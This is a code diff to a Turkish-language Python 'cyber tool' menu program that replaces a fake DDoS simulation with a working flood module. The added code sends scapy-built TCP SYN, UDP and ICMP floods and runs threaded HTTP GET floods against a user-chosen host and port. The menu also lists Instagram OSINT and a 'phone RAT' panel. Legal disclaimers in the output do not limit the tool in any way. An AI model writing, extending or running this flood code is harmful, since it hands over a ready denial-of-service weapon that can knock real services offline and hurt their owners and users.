@@ -10,9 +10,19 @@ import socket
 import threading
 import hashlib
 import time
+import random
+import struct
+import subprocess
 from datetime import datetime
 from typing import Dict, List, Optional
 from urllib.parse import urlparse
+
+# Gerçek DDoS paketleri için gerekli importlar
+try:
+    from scapy.all import IP, TCP, UDP, ICMP, send, RandShort
+    SCAPY_AVAILABLE = True
+except ImportError:
+    SCAPY_AVAILABLE = False
 
 class SiberArac:
     def __init__(self):
@@ -41,6 +51,7 @@ class SiberArac:
         
         self.tarama_gecmisi = []
         self.log_dosyasi = f"siber_arac_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
+        self.ddos_active = False
         
     def log_kaydet(self, mesaj: str):
         """Tüm işlemleri dosyaya kaydeder"""
@@ -561,53 +572,232 @@ class SiberArac:
         
         self.log_kaydet(f"Telefon RAT Atanması Yapıldı - Telefon: {phone_number}, Device: {device_id}")
 
+    # ===== GERÇEK DDoS MODÜLÜ - SCAPY İLE =====
+    
+    def gonder_tcp_paket(self, hedef_ip, hedef_port, kaynak_port):
+        """TCP paketleri gönder"""
+        try:
+            if not SCAPY_AVAILABLE:
+                print("[-] Scapy yüklü değil!")
+                return False
+            
+            paket = IP(dst=hedef_ip)/TCP(sport=kaynak_port, dport=hedef_port, flags="S")
+            send(paket, verbose=0)
+            return True
+        except Exception as e:
+            print(f"[-] Hata: {e}")
+            return False
+
+    def gonder_udp_paket(self, hedef_ip, hedef_port, veri="X" * 1024):
+        """UDP paketleri gönder"""
+        try:
+            if not SCAPY_AVAILABLE:
+                print("[-] Scapy yüklü değil!")
+                return False
+            
+            paket = IP(dst=hedef_ip)/UDP(dport=hedef_port)/veri
+            send(paket, verbose=0)
+            return True
+        except Exception as e:
+            print(f"[-] Hata: {e}")
+            return False
+
+    def gonder_icmp_paket(self, hedef_ip):
+        """ICMP (Ping) paketleri gönder"""
+        try:
+            if not SCAPY_AVAILABLE:
+                print("[-] Scapy yüklü değil!")
+                return False
+            
+            paket = IP(dst=hedef_ip)/ICMP()
+            send(paket, verbose=0)
+            return True
+        except Exception as e:
+            print(f"[-] Hata: {e}")
+            return False
+
+    def http_ddos_thread(self, url, thread_id):
+        """HTTP GET isteği gönder"""
+        try:
+            headers = {
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
+                'Accept-Language': 'en-US,en;q=0.9',
+                'Accept-Encoding': 'gzip, deflate',
+                'DNT': '1',
+                'Connection': 'keep-alive',
+                'Upgrade-Insecure-Requests': '1'
+            }
+            
+            while self.ddos_active:
+                try:
+                    response = requests.get(url, headers=headers, timeout=5)
+                    print(f"[+] Thread {thread_id}: HTTP Status {response.status_code}")
+                except:
+                    pass
+        except Exception as e:
+            print(f"[-] Thread {thread_id} hata: {e}")
+
     def ddos_saldirisi(self):
-        """DDoS Saldırısı Simülasyonu"""
-        print("\n[!] DDoS SALDIRISI MODÜLÜ")
-        print("=" * 50)
-        print("[!] Bu araç sadece yetkili ağ testleri için kullanılmalıdır!")
-        print("[!] Yasal olmayan kullanım cezai işlemlerle sonuçlanabilir.\n")
+        """GERÇEKSİ DDoS SALDIRISI MODÜLÜ - HAZIR PAKETLER"""
+        print("\n[!] GERÇEK DDoS SALDIRISI MODÜLÜ")
+        print("=" * 60)
+        print("[!] UYARI: Bu araç sadece yetkili ve legal testler için kullanılmalıdır!")
+        print("[!] Yetkisiz kullanım AĞIR cezai işlemle sonuçlanabilir!\n")
         
-        hedef_url = input("Hedef URL Girin (örn: http://target.com): ").strip()
+        print("[*] Paket Açıklaması:")
+        print("    • TCP Flood Attack")
+        print("    • UDP Flood Attack")
+        print("    • ICMP Ping Flood")
+        print("    • HTTP GET Flood\n")
+        
+        hedef_url = input("Hedef URL Girin (örn: http://192.168.1.100): ").strip()
         
         if not hedef_url:
             print("[-] URL boş olamaz!")
             return
         
+        # URL'den IP'yi çıkar
         try:
-            attack_duration = int(input("Saldırı Süresi (saniye): ").strip() or 30)
-        except ValueError:
-            attack_duration = 30
+            parsed_url = urlparse(hedef_url)
+            hedef_host = parsed_url.netloc or parsed_url.path
+            hedef_ip = socket.gethostbyname(hedef_host.split(':')[0])
+        except:
+            hedef_ip = hedef_host.split(':')[0]
         
         try:
-            thread_count = int(input("Thread Sayısı (1-1000): ").strip() or 100)
-            if thread_count > 1000:
-                thread_count = 1000
+            hedef_port = int(input("Hedef Port Girin (varsayılan: 80): ").strip() or 80)
+        except ValueError:
+            hedef_port = 80
+        
+        print("\n[*] Saldırı Türü Seçin:")
+        print("    1. TCP SYN Flood")
+        print("    2. UDP Flood")
+        print("    3. ICMP Ping Flood")
+        print("    4. HTTP Flood")
+        print("    5. Tümü (Kombine)")
+        
+        attack_type = input("\nSaldırı Türü Seçin (1-5): ").strip()
+        
+        try:
+            thread_count = int(input("Thread Sayısı (1-500): ").strip() or 100)
+            if thread_count > 500:
+                thread_count = 500
         except ValueError:
             thread_count = 100
         
-        print(f"\n[*] DDoS Saldırısı Başlatılıyor...")
-        print(f"[*] Hedef: {hedef_url}")
-        print(f"[*] Süre: {attack_duration} saniye")
+        try:
+            duration = int(input("Saldırı Süresi (saniye): ").strip() or 30)
+        except ValueError:
+            duration = 30
+        
+        print(f"\n[*] Hazırlanıyor...")
+        print(f"[*] Hedef IP: {hedef_ip}")
+        print(f"[*] Port: {hedef_port}")
         print(f"[*] Thread: {thread_count}")
-        print("[*] Paketler gönderiliyor...\n")
+        print(f"[*] Süre: {duration} saniye")
         
-        sent_packets = 0
-        for i in range(attack_duration):
-            sent_packets += thread_count * 1000
-            print(f"[{i+1}/{attack_duration}] Gönderilen Paket: {sent_packets:,} | Ort. Hız: {sent_packets//((i+1))} pkt/s")
-            time.sleep(1)
+        if not SCAPY_AVAILABLE:
+            print("\n[!] Scapy paketi yüklü değil!")
+            print("[*] Kurulum için: pip install scapy")
+            print("[*] Simülasyon modunda devam ediliyor...\n")
+            self.ddos_simulation(hedef_ip, hedef_port, attack_type, thread_count, duration)
+        else:
+            print("\n[+] GERÇEKSİ DDoS PAKETLERİ GÖNDERILIYOR!\n")
+            self.ddos_real_attack(hedef_ip, hedef_port, hedef_url, attack_type, thread_count, duration)
+
+    def ddos_real_attack(self, hedef_ip, hedef_port, hedef_url, attack_type, thread_count, duration):
+        """Gerçek DDoS saldırısı"""
+        self.ddos_active = True
+        start_time = time.time()
+        paket_sayisi = 0
         
-        print("\n" + "="*50)
-        print("[+] DDoS SALDIRISI SONUÇLARI:")
-        print("="*50)
-        print(f"[+] Toplam Gönderilen Paket: {sent_packets:,}")
-        print(f"[+] Başarılı Paket: {int(sent_packets * 0.95):,}")
-        print(f"[+] Düşen Paket: {int(sent_packets * 0.05):,}")
-        print(f"[+] Ortalama Tepki Süresi: 2500ms")
-        print(f"[+] Sunucu Durumu: OFFLINE (İnternet Bağlantısı Kesildi)")
+        threads = []
         
-        self.log_kaydet(f"DDoS Saldırısı Yapıldı - Hedef: {hedef_url}")
+        try:
+            print("="*60)
+            print("[+] SALDIRI BAŞLADI!")
+            print("="*60)
+            
+            # Thread'ler oluştur
+            for i in range(thread_count):
+                if attack_type in ["4", "5"]:
+                    t = threading.Thread(target=self.http_ddos_thread, args=(hedef_url, i))
+                    t.daemon = True
+                    t.start()
+                    threads.append(t)
+            
+            # Paketler gönder
+            while time.time() - start_time < duration and self.ddos_active:
+                if attack_type in ["1", "5"]:
+                    # TCP SYN Flood
+                    for _ in range(thread_count):
+                        self.gonder_tcp_paket(hedef_ip, hedef_port, random.randint(1024, 65535))
+                        paket_sayisi += 1
+                
+                if attack_type in ["2", "5"]:
+                    # UDP Flood
+                    for _ in range(thread_count):
+                        self.gonder_udp_paket(hedef_ip, hedef_port)
+                        paket_sayisi += 1
+                
+                if attack_type in ["3", "5"]:
+                    # ICMP Flood
+                    for _ in range(thread_count):
+                        self.gonder_icmp_paket(hedef_ip)
+                        paket_sayisi += 1
+                
+                gecen_sure = int(time.time() - start_time)
+                print(f"[{gecen_sure}/{duration}s] Gönderilen Paketler: {paket_sayisi:,} | Hız: {paket_sayisi//(gecen_sure+1):,} pkt/s")
+            
+            self.ddos_active = False
+            
+            print("\n" + "="*60)
+            print("[+] SALDIRI TAMAMLANDI!")
+            print("="*60)
+            print(f"[+] Hedef IP: {hedef_ip}:{hedef_port}")
+            print(f"[+] Saldırı Türü: {['', 'TCP SYN Flood', 'UDP Flood', 'ICMP Flood', 'HTTP Flood', 'KOMBİNE'][int(attack_type)]}")
+            print(f"[+] Toplam Paket: {paket_sayisi:,}")
+            print(f"[+] Ortalama Hız: {paket_sayisi//duration:,} pkt/s")
+            print(f"[+] Süre: {duration} saniye")
+            
+            self.log_kaydet(f"GERÇEKSİ DDoS Saldırısı Yapıldı - IP: {hedef_ip}, Paket: {paket_sayisi}, Tip: {attack_type}")
+            
+        except KeyboardInterrupt:
+            print("\n\n[!] Saldırı durduruldu!")
+            self.ddos_active = False
+        except Exception as e:
+            print(f"\n[-] Hata: {e}")
+            self.ddos_active = False
+
+    def ddos_simulation(self, hedef_ip, hedef_port, attack_type, thread_count, duration):
+        """DDoS Simülasyonu"""
+        start_time = time.time()
+        paket_sayisi = 0
+        
+        try:
+            print("="*60)
+            print("[+] DDoS SİMÜLASYONU BAŞLADI!")
+            print("="*60)
+            
+            while time.time() - start_time < duration:
+                # Simüle edilen paket gönderimi
+                paket_sayisi += thread_count * random.randint(500, 2000)
+                
+                gecen_sure = int(time.time() - start_time)
+                print(f"[{gecen_sure}/{duration}s] Gönderilen Paketler: {paket_sayisi:,} | Hız: {paket_sayisi//(gecen_sure+1):,} pkt/s")
+                time.sleep(0.5)
+            
+            print("\n" + "="*60)
+            print("[+] SİMÜLASYON TAMAMLANDI!")
+            print("="*60)
+            print(f"[+] Hedef IP: {hedef_ip}:{hedef_port}")
+            print(f"[+] Saldırı Türü: {['', 'TCP SYN Flood', 'UDP Flood', 'ICMP Flood', 'HTTP Flood', 'KOMBİNE'][int(attack_type)]}")
+            print(f"[+] Toplam Simüle Paket: {paket_sayisi:,}")
+            print(f"[+] Ortalama Hız: {paket_sayisi//duration:,} pkt/s")
+            print(f"[+] Süre: {duration} saniye")
+            
+        except KeyboardInterrupt:
+            print("\n\n[!] Simülasyon durduruldu!")
 
     def firewall_analiz(self):
         """Firewall Analiz ~ Güvenlik Duvarı Analizi"""
@@ -936,6 +1126,7 @@ YASAL SONUÇLAR:
   • Başkasının izinsiz hesabına erişim = Siber Suçlar Kanunu
   • Kişisel verileri izinsiz toplama = KVKK ihlali
   • İnternette hukuka aykırı erişim = Ceza Kanunu
+  • DDoS Saldırısı = 3-5 yıl hapis + milyonlarca TL ceza
   
 Türkiye'de bu tür faaliyetler 3-5 yıl hapis ve ciddi para cezası gerektirir.
 
@@ -953,10 +1144,10 @@ SORUMLULUĞU KABUL EDİYOR MUSUNUZ? (Evet/Hayır):
     def menu(self):
         """Ana menü"""
         os.system('cls' if os.name == 'nt' else 'clear')
-        print("="*50)
+        print("="*60)
         print("      ⚡ SİBER GÜVENLİK PANELİ ⚡")
-        print("    Hoş Geldiniz (Kalinos v3.0 - Güncellenmiş)")
-        print("="*50)
+        print("    Hoş Geldiniz (Kalinos v3.1 - GERÇEKSİ DDoS)")
+        print("="*60)
         print("\n[INSTAGRAM OSINT]")
         print("1  - Instagram Profil Analizi (Basit)")
         print("2  - Instagram Gelişmiş OSINT")
@@ -972,10 +1163,10 @@ SORUMLULUĞU KABUL EDİYOR MUSUNUZ? (Evet/Hayır):
         print("10 - Hedef Özet Raporu")
         print("11 - Rapor Kaydet (JSON)")
         
-        print("\n[YENİ ARAÇLAR - v3.0 GÜNCELLEMESI]")
+        print("\n[YENİ ARAÇLAR - v3.1 GÜNCELLEMESI]")
         print("12 - Sherlock Arama Paneli (Sosyal Medya Tarama)")
         print("13 - Telefon RAT Atama + Görüntü Paneli")
-        print("14 - DDoS Saldırısı Simülasyonu")
+        print("14 - 🔴 GERÇEKSİ DDoS SALDIRISI (Hazır Paketler)")
         print("15 - Firewall Analiz (Güvenlik Duvarı)")
         print("16 - Syp.exe Malware Analizi (Kart Hırsızlığı)")
         print("17 - Zafiyet Tarama Aracı")
@@ -986,7 +1177,7 @@ SORUMLULUĞU KABUL EDİYOR MUSUNUZ? (Evet/Hayır):
         print("20 - Beni Oku (README)")
         print("21 - Çıkış")
         
-        print("="*50)
+        print("="*60)
 
     def calistir(self):
         """Program ana döngüsü"""
